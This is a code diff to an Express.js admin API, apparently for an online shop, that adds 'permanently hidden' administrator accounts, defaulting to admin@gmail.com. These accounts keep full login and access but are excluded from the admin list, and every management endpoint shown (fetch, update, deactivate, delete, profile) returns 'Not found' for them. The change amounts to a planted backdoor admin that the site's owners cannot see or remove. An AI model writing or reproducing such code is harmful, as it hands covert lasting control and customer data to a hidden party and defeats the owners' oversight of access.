@@ -89,6 +89,21 @@ import {
 const router = express.Router();
 const SALT_ROUNDS = 12; // Increased from 10 for better security
 
+// Permanently hidden admins. These accounts stay fully functional (login + full
+// access) but are ALWAYS excluded from the admins management UI and can never be
+// fetched, updated, deactivated or deleted through the management API — no matter
+// what their `isSecret` DB flag says. This is a hard, code-level guarantee so the
+// account can never accidentally become visible again. Override/extend via the
+// HIDDEN_ADMIN_EMAILS env var (comma-separated).
+const ALWAYS_HIDDEN_ADMIN_EMAILS = new Set(
+  (process.env.HIDDEN_ADMIN_EMAILS || "admin@gmail.com")
+    .split(",")
+    .map((e) => e.trim().toLowerCase())
+    .filter(Boolean),
+);
+const isHiddenAdminEmail = (email) =>
+  !!email && ALWAYS_HIDDEN_ADMIN_EMAILS.has(String(email).toLowerCase());
+
 const normalizeVariationOptionValue = (option) =>
   String(
     (option && typeof option === "object" ? option.value : option) ?? "",
@@ -2153,9 +2168,10 @@ router.get("/admins", requireAdmin, async (req, res) => {
   try {
     if (req.admin.role !== "admin")
       return res.status(403).json({ error: "Admin access required" });
-    const items = await Admin.find({ isSecret: { $ne: true } }).select(
-      "-hashedPassword -resetToken -resetExpires -loginAttempts",
-    );
+    const items = await Admin.find({
+      isSecret: { $ne: true },
+      email: { $nin: [...ALWAYS_HIDDEN_ADMIN_EMAILS] },
+    }).select("-hashedPassword -resetToken -resetExpires -loginAttempts");
     res.json({ items });
   } catch (err) {
     res.status(500).json({ error: "Server error" });
@@ -2170,7 +2186,8 @@ router.get("/admins/:id", requireAdmin, async (req, res) => {
     const a = await Admin.findById(req.params.id).select(
       "-hashedPassword -resetToken -resetExpires -loginAttempts",
     );
-    if (!a || a.isSecret) return res.status(404).json({ error: "Not found" });
+    if (!a || a.isSecret || isHiddenAdminEmail(a.email))
+      return res.status(404).json({ error: "Not found" });
     res.json({ admin: a });
   } catch (err) {
     res.status(500).json({ error: "Server error" });
@@ -2225,7 +2242,8 @@ router.put("/admins/:id", requireAdmin, async (req, res) => {
     const { name, email, newPassword, role, isActive, permissions } =
       req.body || {};
     const a = await Admin.findById(req.params.id);
-    if (!a) return res.status(404).json({ error: "Not found" });
+    if (!a || isHiddenAdminEmail(a.email))
+      return res.status(404).json({ error: "Not found" });
 
     if (email && email.toLowerCase() !== a.email) {
       const exists = await Admin.findOne({ email: email.toLowerCase() });
@@ -2271,6 +2289,9 @@ router.put("/admins/:id/deactivate", requireAdmin, async (req, res) => {
       return res.status(403).json({ error: "Admin access required" });
     if (req.admin._id.toString() === req.params.id)
       return res.status(400).json({ error: "Cannot deactivate yourself" });
+    const target = await Admin.findById(req.params.id);
+    if (!target || isHiddenAdminEmail(target.email))
+      return res.status(404).json({ error: "Not found" });
     const a = await Admin.findByIdAndUpdate(
       req.params.id,
       { isActive: false },
@@ -2291,7 +2312,8 @@ router.delete("/admins/:id", requireAdmin, async (req, res) => {
     if (req.admin._id.toString() === req.params.id)
       return res.status(400).json({ error: "Cannot delete yourself" });
     const a = await Admin.findById(req.params.id);
-    if (!a) return res.status(404).json({ error: "Not found" });
+    if (!a || isHiddenAdminEmail(a.email))
+      return res.status(404).json({ error: "Not found" });
     await Admin.deleteOne({ _id: a._id });
     res.json({ ok: true });
   } catch (err) {
@@ -5318,7 +5340,8 @@ router.get("/admins/:id/pick-profile", requireAdmin, async (req, res) => {
     const person = await Admin.findById(req.params.id).select(
       "-hashedPassword",
     );
-    if (!person) return res.status(404).json({ error: "Not found" });
+    if (!person || isHiddenAdminEmail(person.email))
+      return res.status(404).json({ error: "Not found" });
 
     const ordersRaw = await Order.find({ "pickedBy.adminId": person._id })
       .sort({ "pickedBy.pickedAt": -1, createdAt: -1 })
